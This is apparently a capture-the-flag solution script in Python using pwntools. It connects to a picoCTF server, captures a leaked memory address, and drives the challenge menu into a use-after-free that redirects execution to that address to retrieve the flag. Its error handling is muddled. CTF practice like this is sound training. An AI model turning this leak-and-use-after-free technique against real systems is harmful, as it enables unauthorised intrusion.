from pwn import *
import sys

def unsub():

  P = sys.argv[0]
  PORT = sys.argv[1]

  print(f"{P}: This may take a moment!")
  try:
     conn = remote('mercury.picoctf.net', PORT)

     conn.sendlineafter(b'(e)xit\n', b'S')
     conn.recvuntil(b'OOP! Memory leak...')
     addr = int(conn.recvline().decode().strip(), 16)

     conn.sendlineafter(b'(e)xit\n', b'M')
     conn.sendlineafter(b'Enter your username: \n', b'AAAA')

     conn.sendlineafter(b'(e)xit\n', b'I')
     conn.sendlineafter(b"already(Y/N)?\n", b'Y')

     conn.sendlineafter(b'(e)xit\n', b'L')
     conn.sendlineafter(b'try anyways:\n', p32(addr))

     FLAG = conn.recvline().decode().strip()
     conn.close()
     log.success(f'Flag: {FLAG}')

  except:
     if PORT != 1:
        print(f"Usage: python3 {P} [port number]")
     else:
        print("Err: Port number unspecified")
        return -1

unsub()
